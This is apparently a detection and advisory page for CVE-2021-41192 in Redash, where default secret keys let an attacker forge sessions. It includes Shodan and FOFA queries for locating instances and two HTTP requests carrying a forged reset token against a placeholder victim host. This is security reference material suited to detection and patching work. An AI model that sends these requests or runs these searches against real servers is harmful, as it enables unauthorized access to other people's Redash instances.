---
layout: post
cve_id: CVE-2021-41192
title: Redash Setup Configuration - Default Secrets Disclosure
pcap: true
pcap_path: /pcaps/2021/CVE-2021-41192.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-41192.yaml
snort2_rule: N/A
snort3_rule: N/A
author: bananabr
severity: medium
impact: 'An attacker can gain unauthorized access to sensitive information and potentially
  compromise the Redash application.

  '
remediation: 'Remove or update the default secrets in the Redash setup configuration
  file.

  '
reference:
- https://hackerone.com/reports/1380121
- https://github.com/getredash/redash/security/advisories/GHSA-g8xr-f424-h2rv
- https://nvd.nist.gov/vuln/detail/CVE-2021-41192
- https://github.com/getredash/redash/commit/ce60d20c4e3d1537581f2f70f1308fe77ab6a214
- https://github.com/ARPSyndicate/cvemon
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
  cvss-score: 6.5
  cve-id: CVE-2021-41192
  cwe-id: CWE-1188
  epss-score: 0.87556
  epss-percentile: 0.99433
  cpe: cpe:2.3:a:redash:redash:*:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: redash
  product: redash
  shodan-query: http.favicon.hash:698624197
  fofa-query: icon_hash=698624197
tags:
- cve2021
- cve
- hackerone
- redash
- auth-bypass
- vuln
---

## üîç Vulnerability Description
Redash Setup Configuration is vulnerable to default secrets disclosure (Insecure Default Initialization of Resource). If an admin sets up Redash versions <=10.0 and prior without explicitly specifying the `REDASH_COOKIE_SECRET` or `REDASH_SECRET_KEY` environment variables, a default value is used for both that is the same across all installations. In such cases, the instance is vulnerable to attackers being able to forge sessions using the known default value.

## üåê HTTP Request
```nohighlight
GET /reset/IjEi.YhAmmQ.cdQp7CnnVq02aQ05y8tSBddl-qs HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/3.6.4
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /redash/reset/IjEi.YhAmmQ.cdQp7CnnVq02aQ05y8tSBddl-qs HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

